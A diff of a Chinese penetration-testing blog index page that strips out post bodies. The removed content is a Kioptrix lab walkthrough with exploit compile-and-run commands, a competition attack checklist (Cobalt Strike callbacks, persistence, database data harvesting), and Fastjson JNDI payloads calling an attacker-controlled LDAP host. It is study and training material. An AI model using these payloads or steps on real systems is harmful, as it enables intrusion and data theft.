@@ -242,7 +242,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2025-08-26 10:07:48" itemprop="dateModified" datetime="2025-08-26T10:07:48+08:00">2025-08-26</time>
+      <time title="修改时间：2025-08-26 11:03:57" itemprop="dateModified" datetime="2025-08-26T11:03:57+08:00">2025-08-26</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -280,61 +280,15 @@
     
     <div class="post-body" itemprop="articleBody">
           <h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1-前言"></a>1-前言</h2><p>准备条件：</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#kali系统</span><br><span class="line">kali-linux</span><br><span class="line"></span><br><span class="line">#必要的组件和更新	//运行exp</span><br><span class="line">sudo apt update &amp;&amp; sudo apt upgrade -y</span><br><span class="line">sudo apt install -y build-essential git curl wget unzip vim tmux <span class="built_in">net</span>-tools htop</span><br><span class="line">sudo apt install -y python3 python3-pip python3-venv</span><br><span class="line">sudo apt install -y openjdk-<span class="number">17</span>-jdk</span><br><span class="line">sudo apt install -y libssl-dev</span><br><span class="line">sudo apt install -y netcat-traditional socat tcpdump wireshark</span><br><span class="line">sudo apt install -y nmap traceroute dnsutils</span><br><span class="line">sudo apt install -y exploitdb sqlmap john hydra metasploit-framework</span><br><span class="line">以及其他自定义的必要组件</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="Kioptrix"><a href="#Kioptrix" class="headerlink" title="Kioptrix"></a>Kioptrix</h1><h3 id="Kioptrix-Level-1"><a href="#Kioptrix-Level-1" class="headerlink" title="Kioptrix Level 1"></a>Kioptrix Level 1</h3><p>—–<strong>简单的使用工具排查漏洞</strong>—–</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#快速扫描</span><br><span class="line">nmap -sn <span class="number">192</span>.<span class="number">168</span>.<span class="number">110</span>.<span class="number">0</span>/<span class="number">24</span></span><br><span class="line"></span><br><span class="line">#全端口扫描</span><br><span class="line">nmap -p <span class="number">1</span>-<span class="number">65535</span> -T4 -A -v <span class="number">192</span>.<span class="number">168</span>.<span class="number">110</span>.<span class="number">129</span></span><br></pre></td></tr></table></figure>
-<p><img src="D:\Desktop\blog\blog\source\image\oscp-image-log\easy\Kioptrix_Level_1\1.png" alt="扫描的tcp连接内容"></p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">---寻找低版本的框架或者容器查找[exp]---</span><br><span class="line">nikto -host <span class="number">192</span>.<span class="number">168</span>.xxx.xx</span><br><span class="line">nuclei -u <span class="number">192</span>.<span class="number">168</span>.xxx.xx</span><br></pre></td></tr></table></figure>
-
-<p><img src="D:\Desktop\blog\blog\source\image\oscp-image-log\easy\Kioptrix_Level_1\2-0.png" alt="扫描的tcp连接内容"></p>
-<p><img src="D:\Desktop\blog\blog\source\image\oscp-image-log\easy\Kioptrix_Level_1\2-1.png" alt="扫描的tcp连接内容"></p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#查找exp利用</span><br><span class="line">searchsploit mod_ssl</span><br></pre></td></tr></table></figure>
-
-<p><img src="D:\Desktop\blog\blog\source\image\oscp-image-log\easy\Kioptrix_Level_1\2.png" alt="扫描的tcp连接内容"></p>
-<p>对比可得3个可尝试exp</p>
-<hr>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#编译</span><br><span class="line">gcc -o exploit <span class="number">47080</span>.c -lcrypto</span><br><span class="line">#运行对应版本</span><br><span class="line">./exploit -h								#帮助</span><br><span class="line">./exploit | grep apache-<span class="number">1</span>.<span class="number">3</span>.<span class="number">20</span>				#版本</span><br><span class="line">./exploit <span class="number">0</span>x6b <span class="number">192</span>.<span class="number">168</span>.<span class="number">110</span>.<span class="number">129</span> <span class="number">80</span> -c <span class="number">50</span>			#运行</span><br></pre></td></tr></table></figure>
-
-<p><img src="D:\Desktop\blog\blog\source\image\oscp-image-log\easy\Kioptrix_Level_1\3.png" alt="扫描的tcp连接内容"></p>
-<p>流程是这么个流程，但是这个exp太过于久远了，难以运行</p>
-<p>所以换其它的不需要lcrypto的exp运行</p>
-<h5 id="我采用的攻击方式"><a href="#我采用的攻击方式" class="headerlink" title="我采用的攻击方式"></a>我采用的攻击方式</h5><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#存在<span class="number">139</span>端口samba服务，且得知系统为linux框架</span><br></pre></td></tr></table></figure>
-
-<p><img src="D:\Desktop\blog\blog\source\image\oscp-image-log\easy\Kioptrix_Level_1\1.png" alt="扫描的tcp连接内容"></p>
-<p>搜索该服务：</p>
-<p><img src="D:\Desktop\blog\blog\source\image\oscp-image-log\easy\Kioptrix_Level_1\4-0.png" alt="扫描的tcp连接内容"></p>
-<p>发现非常多的exp，但是nmap没有版本，难不成这么多exp一个个试？</p>
-<p>有两种方法msfconsole&#x2F;nuclei跑出版本，msfconsole跑出版本前提是需要存在版本泄露的漏洞，虽然nuclei也是一样，但是架不住快呀:</p>
-<p><img src="D:\Desktop\blog\blog\source\image\oscp-image-log\easy\Kioptrix_Level_1\4-1.png" alt="扫描的tcp连接内容"></p>
-<p><img src="D:\Desktop\blog\blog\source\image\oscp-image-log\easy\Kioptrix_Level_1\4-2.png" alt="扫描的tcp连接内容"></p>
-<hr>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#或者nuclei直接跑出版本号</span><br><span class="line">nuclei.exe -u http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">110</span>.<span class="number">129</span>:<span class="number">139</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="D:\Desktop\blog\blog\source\image\oscp-image-log\easy\Kioptrix_Level_1\4-3.png" alt="扫描的tcp连接内容"></p>
-<p>跑出版本2.2.1a就可以直接跑小于2.2.8这个版本的了</p>
-<p>直接编译运行即可</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#编译</span><br><span class="line">gcc <span class="number">10</span>.c -o samba_exp		#-o为输出文件</span><br></pre></td></tr></table></figure>
-
-<p><img src="D:\Desktop\blog\blog\source\image\oscp-image-log\easy\Kioptrix_Level_1\5.png" alt="扫描的tcp连接内容"></p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#查看帮助</span><br><span class="line">./samba_exp</span><br></pre></td></tr></table></figure>
-
-<p><img src="D:\Desktop\blog\blog\source\image\oscp-image-log\easy\Kioptrix_Level_1\5-2.png" alt="扫描的tcp连接内容"></p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#运行</span><br><span class="line">./samba_exp -b0 <span class="number">192</span>.<span class="number">168</span>.<span class="number">110</span>.<span class="number">129</span>	#-b为目标，<span class="number">0</span>为linux</span><br></pre></td></tr></table></figure>
-
-<p><img src="D:\Desktop\blog\blog\source\image\oscp-image-log\easy\Kioptrix_Level_1\6.png" alt="扫描的tcp连接内容"></p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">找出版本后直接在msfconsole上搜索exp跑也可以</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
-
-<p><img src="D:\Desktop\blog\blog\source\image\oscp-image-log\easy\Kioptrix_Level_1\0.png" alt="扫描的tcp连接内容"></p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">其他的服务版本都很低，可以信息搜集后用工具跑，低权限就uname -a查看内核版本，看searchsploit里面有无提权exp，或者直接cs上线跑提权工具</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
-
-<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>1.RCE前提是存在漏洞</p>
-<p>2.渗透主要是信息搜集</p>
-<p>3.主要考核了工具使用</p>
-<h3 id="参考的文章"><a href="#参考的文章" class="headerlink" title="参考的文章"></a>参考的文章</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/KUANTECH/p/17941528">Lab 1-Vulnhub - Kioptix Level 1 - KUANTECH - 博客园</a></p>
-
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#kali系统</span><br><span class="line">kali-linux</span><br><span class="line"></span><br><span class="line">#必要的组件和更新	//运行exp</span><br><span class="line">sudo apt update &amp;&amp; sudo apt upgrade -y</span><br><span class="line">sudo apt install -y build-essential git curl wget unzip vim tmux <span class="built_in">net</span>-tools htop</span><br><span class="line">sudo apt install -y python3 python3-pip python3-venv</span><br><span class="line">sudo apt install -y openjdk-<span class="number">17</span>-jdk</span><br><span class="line">sudo apt install -y libssl-dev</span><br><span class="line">sudo apt install -y netcat-traditional socat tcpdump wireshark</span><br><span class="line">sudo apt install -y nmap traceroute dnsutils</span><br><span class="line">sudo apt install -y exploitdb sqlmap john hydra metasploit-framework</span><br><span class="line">以及其他自定义的必要组件</span><br></pre></td></tr></table></figure>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2025/08/25/oscp_attack-log/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -388,9 +342,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2025-08-06 00:00:00 / 修改时间：17:01:10" itemprop="dateCreated datePublished" datetime="2025-08-06T00:00:00+08:00">2025-08-06</time>
+      <time title="创建时间：2025-08-06 00:00:00" itemprop="dateCreated datePublished" datetime="2025-08-06T00:00:00+08:00">2025-08-06</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-08-26 11:03:02" itemprop="dateModified" datetime="2025-08-26T11:03:02+08:00">2025-08-26</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -502,132 +462,14 @@
 <td><a target="_blank" rel="noopener" href="https://www.virtualhackinglabs.com/">Virtual Hacking Labs</a></td>
 </tr>
 </tbody></table>
-<hr>
-<h2 id="顺序"><a href="#顺序" class="headerlink" title="顺序"></a>顺序</h2><table>
-<thead>
-<tr>
-<th>阶段</th>
-<th>目标</th>
-<th>平台</th>
-<th>代表靶机&#x2F;课程</th>
-<th>练习重点</th>
-<th>时间安排</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>阶段1 入门</strong></td>
-<td>掌握基础漏洞、工具使用</td>
-<td>VulnHub</td>
-<td>Kioptrix 1~5、Metasploitable 2、Mr. Robot</td>
-<td>端口扫描、Web 枚举、基础提权</td>
-<td>2~3 月</td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-<td>TryHackMe</td>
-<td>Basic Pentesting、Linux PrivEsc</td>
-<td>任务引导，熟悉基础流程</td>
-<td></td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-<td>Hack The Box (HTB)</td>
-<td>Lame、Blue、Legacy</td>
-<td>简单靶机练习</td>
-<td></td>
-</tr>
-<tr>
-<td><strong>阶段2 核心训练</strong></td>
-<td>OSCP 风格单机渗透</td>
-<td>VulnHub</td>
-<td>DC 系列、Stapler</td>
-<td>Linux&#x2F;Windows 提权与漏洞利用</td>
-<td>3~5 月</td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-<td>Hack The Box</td>
-<td>Optimum、Bastion、Netmon</td>
-<td>无 Metasploit 漏洞利用</td>
-<td></td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-<td>CyberSecLabs</td>
-<td>基础 Linux &amp; Windows 机器</td>
-<td>实战环境模拟</td>
-<td></td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-<td>OffSec Proving Grounds Play</td>
-<td>Jacko、Twiggy、HelpDesk</td>
-<td>官方免费靶机，接近考试</td>
-<td></td>
-</tr>
-<tr>
-<td><strong>阶段3 内网 &amp; AD</strong></td>
-<td>掌握 AD 渗透、横向移动</td>
-<td>TryHackMe</td>
-<td>Attacktive Directory</td>
-<td>AD 域环境入门</td>
-<td>4~6 月</td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-<td>Hack The Box</td>
-<td>Active、Forest、Sauna、Cascade</td>
-<td>域控提权，Kerberoasting 等</td>
-<td></td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-<td>CyberSecLabs</td>
-<td>AD 环境机器</td>
-<td>横向移动、域权限提升</td>
-<td></td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-<td>OffSec Proving Grounds Enterprise</td>
-<td>Enterprise 系列</td>
-<td>官方内网环境</td>
-<td></td>
-</tr>
-<tr>
-<td><strong>阶段4 考前冲刺</strong></td>
-<td>模拟考试环境，提升效率</td>
-<td>OffSec PWK Labs</td>
-<td>官方 Easy→Medium→Hard</td>
-<td>全面实战，计时训练</td>
-<td>3~4 月</td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-<td>Hack The Box</td>
-<td>Buff、OpenAdmin、Blunder、Resolute</td>
-<td>中高难度机器冲刺</td>
-<td></td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-<td>Virtual Hacking Labs</td>
-<td>高级 Windows&#x2F;Linux 靶机</td>
-<td>系统性综合训练</td>
-<td></td>
-</tr>
-</tbody></table>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2025/08/06/oscp%E9%9D%B6%E5%9C%BA/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -689,7 +531,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2025-08-05 09:57:08" itemprop="dateModified" datetime="2025-08-05T09:57:08+08:00">2025-08-05</time>
+      <time title="修改时间：2025-08-26 11:03:14" itemprop="dateModified" datetime="2025-08-26T11:03:14+08:00">2025-08-26</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -732,33 +574,14 @@
 <p>3&gt;地区&#x2F;县区，找内网的权限分和信息分</p>
 <p>4&gt;省&#x2F;市，随便找找</p>
 <p>5&gt;记得专门划分一个写报告，要不然挖到也没有首发，30%的分，后面信息分没了就直接不给分</p>
-<h1 id="2-攻击手法"><a href="#2-攻击手法" class="headerlink" title="2.攻击手法"></a>2.攻击手法</h1><p>1&gt;快速确定框架，导出api和目录，查看是否存在敏感目录</p>
-<p>2&gt;框架漏洞扫描和漏扫，爆破api和访问目录找未授权和越权</p>
-<p>3&gt;有未授权或者越权就扩大危害（找信息分或者其他设备权限分），无则查看存在目录是否存在登录端第⑤步</p>
-<p>4&gt;记录可访问接口和目录，接口跑一遍sqlmap和指纹，再次识别框架和检查注入点</p>
-<blockquote>
-<p>5&gt;弱口令爆破隐藏后台，后台查找文件上传点和设备或者管理员权限，cs上线sock5连接</p>
-<p>5’&gt;sqlmap跑出dba获得主机权限</p>
-<p>6&gt;内网权限维持，sock5同一网段，定时任务，映射ssh端口或3306端口</p>
-</blockquote>
-<p>&lt;1&gt;内网确定主机，内网web端，数据库</p>
-<p>​	①权限-横向移动     &#x3D;&#x3D;    已知历史漏洞梭哈&#x2F;攻陷内网其他主机web&#x2F;获取其他数据库dba</p>
-<p>​	②信息-扩大产出     &#x3D;&#x3D;    数据库公民信息获取&#x2F;内网web端后台信息泄露&#x2F;sms主机或者业务主机</p>
-<p>&#x2F;&#x2F;分支</p>
-<p>—— ③内网钓鱼</p>
-<h1 id="3-总结"><a href="#3-总结" class="headerlink" title="3.总结"></a>3.总结</h1><p>1.获取内网权限普遍的三种方法</p>
-<p>​	①sql注入获取dba</p>
-<p>​	②文件上传获取shell</p>
-<p>​	③远程代码执行</p>
-<p>&#x2F;&#x2F;分支</p>
-<p>——-①框架漏洞梭哈&#x2F;\编辑器&#x2F;\oa框架&#x2F;\sql文件上传</p>
-<p>——-②主机漏洞梭哈&#x2F;\Metasploit&#x2F;\kali</p>
-<p>——-③缓冲区溢出&#x2F;\kali&#x2F;\Metasploit</p>
-<p>2.现在我的能力仅限于发现和利用已经存在的漏洞，只能寻找数据与代码边界不清的地方，不能突破数据和命令的边界，当然要是让我做安全服务天天写报告我也不想</p>
-<p>​	简单来说现在我就是一个加强版的<strong>指纹识别</strong></p>
-<p>​	一句话概括我的能力就是	“<strong>漏洞来源于发现</strong>“	</p>
-<p>​	远没有达到	“<strong>漏洞来源于挖掘</strong>“</p>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2025/08/04/%E6%B9%96%E6%B9%98%E6%9D%AF%E8%AE%B0%E5%BD%95/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -812,9 +635,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2025-07-09 00:00:00 / 修改时间：11:24:03" itemprop="dateCreated datePublished" datetime="2025-07-09T00:00:00+08:00">2025-07-09</time>
+      <time title="创建时间：2025-07-09 00:00:00" itemprop="dateCreated datePublished" datetime="2025-07-09T00:00:00+08:00">2025-07-09</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-08-26 11:03:41" itemprop="dateModified" datetime="2025-08-26T11:03:41+08:00">2025-08-26</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -858,145 +687,14 @@
 <li>目标环境中存在 <code>com.sun.rowset.JdbcRowSetImpl</code> 类（通常存在于 JDK 或 Tomcat 中）</li>
 <li>目标未配置安全白名单或开启 <code>safeMode</code></li>
 </ol>
-<hr>
-<h3 id="漏洞验证步骤（仅访问-HTTP-服务）"><a href="#漏洞验证步骤（仅访问-HTTP-服务）" class="headerlink" title="漏洞验证步骤（仅访问 HTTP 服务）"></a>漏洞验证步骤（仅访问 HTTP 服务）</h3><h4 id="1-准备-Payload"><a href="#1-准备-Payload" class="headerlink" title="1. 准备 Payload"></a>1. 准备 Payload</h4><p>以下 Payload 会让目标服务器尝试连接 <code>192.168.1.12:8000</code>（需替换为你的 IP）：</p>
-<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://192.168.1.12:8000/Exploit&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>原理</strong>：<br>当 Fastjson 解析 <code>autoCommit</code> 属性时，会调用 <code>setAutoCommit(true)</code> → 触发 JNDI 查找 → 访问 <code>dataSourceName</code> 中的地址。</p>
-<h4 id="2-启动-HTTP-监听服务"><a href="#2-启动-HTTP-监听服务" class="headerlink" title="2. 启动 HTTP 监听服务"></a>2. 启动 HTTP 监听服务</h4><p>在 <code>192.168.1.12</code> 上执行：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8000</span><br></pre></td></tr></table></figure>
-
-<p>或使用 <code>nc</code> 监听：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 8000</span><br></pre></td></tr></table></figure>
-
-<h4 id="3-发送-Payload-到目标"><a href="#3-发送-Payload-到目标" class="headerlink" title="3. 发送 Payload 到目标"></a>3. 发送 Payload 到目标</h4><p>将 Payload 作为 POST 数据发送到目标 Fastjson 接口（如 <code>/json</code>）：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST http://&lt;TARGET_IP&gt;:&lt;PORT&gt;/api -H <span class="string">&quot;Content-Type: application/json&quot;</span> -d <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">  &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span></span><br><span class="line"><span class="string">  &quot;dataSourceName&quot;: &quot;ldap://192.168.1.12:8000/Exploit&quot;,</span></span><br><span class="line"><span class="string">  &quot;autoCommit&quot;: true</span></span><br><span class="line"><span class="string">&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="4-验证漏洞"><a href="#4-验证漏洞" class="headerlink" title="4. 验证漏洞"></a>4. 验证漏洞</h4><ul>
-<li><p>若在 <code>192.168.1.12:8000</code> 的 HTTP 服务收到 <strong>GET 请求</strong>（路径 <code>/Exploit</code>），证明漏洞存在。</p>
-</li>
-<li><p>示例日志：</p>
-<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.X.X - - [TIMESTAMP] &quot;GET /Exploit HTTP/1.1&quot; 404 -</span><br></pre></td></tr></table></figure></li>
-</ul>
-<hr>
-<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ol>
-<li><p><strong>依赖要求</strong>：<br>目标需存在 <code>JdbcRowSetImpl</code> 类（通常满足），若返回 <code>Class not found</code> 则说明环境缺失依赖。</p>
-</li>
-<li><p><strong>网络可达</strong>：<br>确保目标服务器能访问 <code>192.168.1.12:8000</code>（检查防火墙&#x2F;路由）。</p>
-</li>
-<li><p><strong>安全模式</strong>：<br>若目标开启 <code>safeMode</code>（禁用 autoType），Payload 将失效：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setSafeMode(<span class="literal">true</span>);  <span class="comment">// 免疫漏洞</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>无 RCE 风险</strong>：<br>此 Payload 仅触发 HTTP 请求，<strong>不会执行任意代码</strong>，符合安全测试要求。</p>
-</li>
-</ol>
-<hr>
-<h3 id="补充说明"><a href="#补充说明" class="headerlink" title="补充说明"></a>补充说明</h3><ul>
-<li><strong>更高版本影响</strong>：Fastjson ≥1.2.84 默认关闭 autoType，需手动开启白名单。</li>
-<li><strong>修复建议</strong>：<ul>
-<li>升级 Fastjson 至最新版</li>
-<li>启用 <code>safeMode</code></li>
-<li>配置 <code>autoType</code> 白名单</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<p>以上方法仅用于安全测试，请遵守法律法规。确认漏洞后请及时修复。</p>
-</blockquote>
-<hr>
-<h1 id="Fastjson-1-2-80-反序列化漏洞详细分析（含白名单场景）"><a href="#Fastjson-1-2-80-反序列化漏洞详细分析（含白名单场景）" class="headerlink" title="Fastjson 1.2.80 反序列化漏洞详细分析（含白名单场景）"></a>Fastjson 1.2.80 反序列化漏洞详细分析（含白名单场景）</h1><h4 id="报错分析"><a href="#报错分析" class="headerlink" title="报错分析"></a>报错分析</h4><p>若存在报错 <code>org.springframework.http.converter.HttpMessageNotReadableException</code> 表明：</p>
-<ol>
-<li><strong>Spring MVC 正在处理请求</strong>，且使用了内置的 HTTP 消息转换器</li>
-<li><strong>请求体解析失败</strong>，可能是 Fastjson 在处理恶意 payload 时抛出的异常</li>
-<li><strong>环境包含 Spring&#x2F;MyBatis</strong> 可能扩展了攻击面</li>
-</ol>
-<hr>
-<h3 id="白名单配置检查"><a href="#白名单配置检查" class="headerlink" title="白名单配置检查"></a>白名单配置检查</h3><p>当存在以下配置时，Fastjson 可能允许特定类被反序列化（绕过防护）：</p>
-<h4 id="1-显式白名单配置"><a href="#1-显式白名单配置" class="headerlink" title="1. 显式白名单配置"></a>1. 显式白名单配置</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 危险的白名单配置示例</span></span><br><span class="line">ParserConfig.getGlobalInstance().addAccept(<span class="string">&quot;com.sun.rowset.&quot;</span>);</span><br><span class="line">ParserConfig.getGlobalInstance().addAccept(<span class="string">&quot;org.apache.tomcat.&quot;</span>);</span><br></pre></td></tr></table></figure>
-
-<h4 id="2-AutoType-白名单"><a href="#2-AutoType-白名单" class="headerlink" title="2. AutoType 白名单"></a>2. AutoType 白名单</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 启用 AutoType 并添加白名单</span></span><br><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">ParserConfig.getGlobalInstance().addAccept(<span class="string">&quot;com.example.safe.&quot;</span>);</span><br></pre></td></tr></table></figure>
-
-<h4 id="3-特定注解使用"><a href="#3-特定注解使用" class="headerlink" title="3. 特定注解使用"></a>3. 特定注解使用</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@JSONType(autoTypeCheckHandler = MySafeHandler.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="comment">// 可能被利用的 setter 方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h3 id="针对环境的增强-Payload"><a href="#针对环境的增强-Payload" class="headerlink" title="针对环境的增强 Payload"></a>针对环境的增强 Payload</h3><p>结合 Spring + MyBatis 环境，以下 payload 可能更有效（目标：触发对 <code>192.168.1.12:8000</code> 的访问）：</p>
-<h4 id="方案-1：MyBatis-SQL-驱动类利用"><a href="#方案-1：MyBatis-SQL-驱动类利用" class="headerlink" title="方案 1：MyBatis SQL 驱动类利用"></a>方案 1：MyBatis SQL 驱动类利用</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;data_source&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://192.168.1.12:8000/Exploit&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="方案-2：Spring-JNDI-扩展"><a href="#方案-2：Spring-JNDI-扩展" class="headerlink" title="方案 2：Spring JNDI 扩展"></a>方案 2：Spring JNDI 扩展</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;shareableResources&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;ldap://192.168.1.12:8000/Exploit&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span 